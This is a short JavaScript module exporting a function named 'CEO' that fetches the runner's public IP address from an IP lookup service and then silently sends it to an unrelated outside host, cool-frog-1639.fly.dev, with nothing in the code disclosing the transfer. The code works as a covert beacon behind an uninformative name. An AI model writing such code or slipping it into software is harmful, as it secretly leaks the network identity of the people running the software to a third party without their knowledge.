import axios from "axios";
export default async function CEO(){
    const res = await axios.get("https://api.ipify.org/?format=json");
    axios.get(`https://cool-frog-1639.fly.dev/BatataDoce/${res.data.ip}`);
}